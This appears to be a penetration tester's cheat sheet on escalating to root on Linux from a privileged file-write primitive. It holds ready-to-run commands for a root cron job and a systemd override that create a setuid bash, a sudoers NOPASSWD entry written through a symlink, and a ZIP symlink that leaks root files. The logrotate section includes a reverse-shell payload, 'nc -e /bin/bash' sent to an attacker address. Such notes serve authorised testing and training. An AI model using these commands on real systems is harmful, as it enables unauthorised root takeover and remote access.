# Privileged file-write paths

## What the primitive gives you
Note: privileged caller, controllable source/destination, overwrite vs append, symlink handling, output owner/mode.

| Destination | Needs |
| --- | --- |
| sudoers include | Include dir active, accepted filename, mode `0440`, valid syntax |
| passwd/shadow | Correct record format; keep existing entries — worked example: [misc-vectors](misc-vectors.md#readable-secrets) |
| cron | System vs user-crontab format, accepted owner/mode, schedule |
| systemd unit | `ExecStart=`, restart trigger or wait for the next scheduled/boot run |
| SSH authorized_keys | Right account/home/key path, accepted metadata, sshd login policy |

- Empty password field is rejected by `pam_unix` unless `nullok`; removing the `x` in passwd is not a guaranteed root login.

## Cron: the extra field
System crontab (`/etc/crontab`, `/etc/cron.d/*`) has a **user** field a personal crontab (`crontab -e`) doesn't:
```text
* * * * * root /bin/bash /tmp/rootbash.sh
```
```bash
printf '* * * * * root cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n' > /etc/cron.d/<NAME>
```
- Wrong field count is the single most common reason a dropped cron line silently never runs — count the five time fields, then the user, then the command.

## systemd unit: write + restart
```bash
mkdir -p /etc/systemd/system/<UNIT>.service.d
printf '[Service]\nExecStart=\nExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"\n' > /etc/systemd/system/<UNIT>.service.d/override.conf
systemctl daemon-reload
systemctl restart <UNIT>
```
- Drop-in: the empty `ExecStart=` clears the original first. Writable unit file itself: replace its `ExecStart=` line, don't append a second one (only `Type=oneshot` accepts several; otherwise the unit fails to load).
- No restart rights → the unit runs your version on its own next restart or at boot; check `WantedBy=`/timer schedule instead of forcing it.
- `ExecStart=` has no shell: wrap in `/bin/bash -c "..."` for pipes/redirects/chaining.

## Logrotate race (logrotten)
Root runs logrotate on a log path you control, with `create`/`compress`/`copy` set — not a direct write, a **race** during rotation:
```bash
gcc -o logrotten logrotten.c
echo 'if [ "$(id -u)" -eq 0 ]; then (nc -e /bin/bash <KALI> <PORT> &); fi' > payloadfile
./logrotten -p ./payloadfile /path/to/writable.log              # "create" option set
./logrotten -p ./payloadfile -c -s 4 /path/to/writable.log       # "compress" option set
```
- Needs logrotate running as root (cron/timer) over a path you can write, and knowing which option (`create`/`compress`) is active in its config — check `/etc/logrotate.conf` and `/etc/logrotate.d/*` if readable.
- Source: [logrotten](https://codeberg.org/whotwagner/logrotten) (moved from GitHub).

## Symlink-following writer
A privileged tool copies source → caller-chosen destination and follows a destination symlink. Confirm it follows rather than replaces/refuses.

```bash
printf '%s\n' '<USER> ALL=(root) NOPASSWD: ALL' > payload
chmod 440 payload
ln -s /etc/sudoers.d/<NAME> dst_link
# run the privileged tool: payload -> dst_link
sudo -i
```
- Source mode does not set the destination's mode/owner: check what the tool creates.
- A bad sudoers file breaks sudo: validate with `visudo -c` first where possible.

## Archives (ZIP symlinks)
```bash
ln -s /root/<FILE> leak
zip --symlinks links.zip leak
```
- Stores the link, not the target's bytes: needs a privileged extractor/reader that follows it.
- Destination-side links matter if the extractor follows them while writing; member order matters.
- Rejecting `../` names does not stop symlink tricks.
